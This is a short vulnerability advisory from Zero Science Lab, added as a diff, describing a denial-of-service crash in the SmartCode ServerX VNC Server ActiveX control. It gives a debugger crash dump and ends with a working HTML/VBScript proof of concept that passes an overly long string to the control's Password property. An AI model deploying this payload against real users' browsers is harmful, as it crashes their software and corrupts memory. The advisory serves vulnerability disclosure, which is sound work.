@@ -1,0 +1,58 @@
+Title: SmartCode ServerX VNC Server ActiveX 1.1.5.0 (scvncsrvx.dll) DoS Exploit
+
+
+Vendor: SmartCode Solutions
+Product Web Page: htt://www.s-code.com
+Version Tested: 1.1.5.0
+
+Summary: SmartCode ServerX VNC Server control is a VNC server implemented as an
+ActiveX component, which makes it extremely easy for you to integrate VNC support
+into your Web or desktop applications. In the simplest scenario, you would add the
+ServerX ActiveX component to your project, place the ServerX instance in a form,
+and modify the ActiveX properties if desired. That's it - you just created an
+application with a VNC Server embedded in it.
+
+Desc: The vulnerability exist in the CSC_ServerXControl class with all its members.
+When parsing overly long string while listening for incoming connection the application
+crashes along with IE, corrupting the memory.
+
+--
+
+(26d8.25bc): C++ EH exception - code e06d7363 (first chance)
+CSC_ServerXControl::FinalRelease
+eax=00000000 ebx=00000000 ecx=7c800000 edx=7c97b120 esi=7c90de50 edi=00000000
+eip=7c90e4f4 esp=0013fe5c ebp=0013ff58 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+ntdll!KiFastSystemCallRet:
+7c90e4f4 c3              ret
+
+--
+
+Tested On: Microsoft Windows XP Professional SP3 (EN)
+           Windows Internet Explorer 8.0.6001.18702
+
+Zero Science Lab Advisory ID: ZSL-2010-4948
+Zero Science Lab Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2010-4948.php
+
+
+Vulnerability Discovered By: Gjoko 'LiquidWorm' Krstic
+liquidworm gmail com
+
+Zero Science Lab - http://www.zeroscience.mk
+
+13.08.2010
+
+
+
+PoC:
+
+<html>
+<object classid='clsid:8818CF4D-2190-49C3-B7EB-B9F2AE198CB1' id='zsl' />
+<script language='vbscript'>
+
+dos=String(18212, "A")
+
+zsl.Password = dos
+
+</script>
+</html>
